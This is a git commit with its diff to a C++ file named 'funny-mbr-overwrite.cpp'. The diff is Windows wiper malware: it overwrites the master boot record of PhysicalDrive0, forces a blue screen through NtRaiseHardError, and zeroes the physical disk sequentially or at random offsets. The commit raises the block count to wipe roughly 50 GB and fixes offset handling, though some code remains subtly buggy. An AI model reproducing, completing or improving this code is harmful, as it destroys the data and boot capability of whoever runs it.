f38b7478356900b2e89bf9b3e6beffc4974d701a
Manaball123 <manaball123@hotmail.com>
2022-07-27 00:03:08 +0800

    sort of fixed the drive zeroing(my vm is slow af  so i wouldnt know but its saying write success)
    also need to fix random too, shouldnt be too hard tho tbh

--- funny-mbr-overwrite.cpp
+++ funny-mbr-overwrite.cpp
@@ -16,24 +16,26 @@
 
 //GENERAL ARGUMENTS
 //COMMENT OUT TO DISABLE A SPECIFIC FEATURE
-    #define OW_MBR 
-//  #define ZERO_DRIVE 
-    #define BSOD 
+//  #define OW_MBR 
+    #define ZERO_DRIVE 
+//  #define BSOD 
 
 
 
 //ARGUMENTS FOR ZERO DRIVE THINGY
 
+//Overwrites sequentially
+    #define MODE_FULL  
+//Randomly chooses blocks to write to
+//Causes more file corruption
+//  #define MODE_RANDOM     
+
 #define BLOCK_SIZE      512
-#define BLOCKS_TO_OW    65536
+#define BLOCKS_TO_OW    97656250
 //Size of 256gb drive
 #define MAX_OFFSET_L    0xFFFFFFFF
 #define MAX_OFFSET_H    0x0000003F
-//Overwrites sequentially
-#define MODE_FULL       1
-//Randomly chooses blocks to write to
-//Causes more file corruption
-#define MODE_RANDOM 0
+
 
 #define PRINT_LOGS 1
 
@@ -44,7 +46,8 @@ extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BO
 extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
     PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
 
-
+using uint64 = unsigned __int64;
+using uint32 = unsigned __int32;
 
 bool BlueScreen()
 {
@@ -66,19 +69,21 @@ bool OverwriteMBR()
     HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     bool res = WriteFile(hMBR, buffer, MBR_SIZE, &bytes_read, 0);
     CloseHandle(hMBR);
+    delete[] buffer;
     return res;
 }
 
 bool WriteChunk(HANDLE handle, char* buffer, OVERLAPPED* ol)
 {
-    DWORD bytes_read = BLOCK_SIZE;
+    DWORD* bytes_read = new DWORD;
     
-    bool res = WriteFile(handle, buffer, BLOCK_SIZE, &bytes_read, ol);
+    bool res = WriteFile(handle, buffer, BLOCK_SIZE, bytes_read, ol);
+    delete bytes_read;
     if (PRINT_LOGS)
     {
-        unsigned __int64 fullOffset = ((unsigned __int64)ol->OffsetHigh << 32) | ol->Offset;
+        uint64 fullOffset = ((uint64)ol->OffsetHigh << 32) | ol->Offset;
         printf("Wrote to offset ");
-        printf("%d", fullOffset);
+        printf("%llx", fullOffset);
         printf(". Result: ");
         if(res)
         {
@@ -89,6 +94,7 @@ bool WriteChunk(HANDLE handle, char* buffer, OVERLAPPED* ol)
             printf("FAILED\n");
         }
     }
+    
     return res;
 }
 
@@ -99,15 +105,29 @@ bool ZeroDrive()
     ZeroMemory(buf,BLOCK_SIZE);
 #ifdef MODE_FULL
     
-    for (unsigned int i = 0; i < BLOCKS_TO_OW; i++)
+    for (uint32 i = 0; i < BLOCKS_TO_OW; i++)
     {
-        OVERLAPPED ol;
-        memset(&ol, 0, 512);
-        ol.hEvent = NULL;
+        OVERLAPPED* ol = new OVERLAPPED;
+        memset(ol, 0, sizeof(OVERLAPPED));
+        ol->hEvent = NULL;
 
-        ol.Offset = i * BLOCK_SIZE;
-        ol.OffsetHigh = i * BLOCK_SIZE;
-        WriteChunk(fhandle, buf, &ol);
+        uint64 addr = i * BLOCK_SIZE;
+        if (addr > 0xffffffff)
+        {
+
+            ol->Offset = (uint32)(addr & 0xffffffff);
+            ol->OffsetHigh = (uint32)((addr & 0xffffffff00000000) >> 32);
+        }
+        else
+        {
+            ol->Offset = (uint32)addr;
+            ol->OffsetHigh = 0;
+
+        }
+
+        
+        WriteChunk(fhandle, buf, ol);
+        delete ol;
     }
     
 #endif
@@ -115,12 +135,14 @@ bool ZeroDrive()
     
         for (unsigned int i = 0; i < BLOCKS_TO_OW; i++)
         {
-            OVERLAPPED ol;
-            memset(&ol, 0, 512);
-            ol.hEvent = NULL;
-            ol.Offset = rand() % MAX_OFFSET_L;
-            ol.OffsetHigh = rand() % MAX_OFFSET_H;
-            WriteChunk(fhandle, buf, &ol);
+            OVERLAPPED* ol = new OVERLAPPED;
+            memset(ol, 0, 512);
+            ol->hEvent = NULL;
+            ol->Offset = rand() % MAX_OFFSET_L;
+            ol->OffsetHigh = rand() % MAX_OFFSET_H;
+ 
+            WriteChunk(fhandle, buf, ol);
+            delete ol;
         }
 #endif
     CloseHandle(fhandle);
@@ -131,7 +153,7 @@ bool ZeroDrive()
 int main()
 {
 
-#ifdef ZERO_DRIVE
+#ifdef OW_MBR
     
     if (OverwriteMBR())
     {
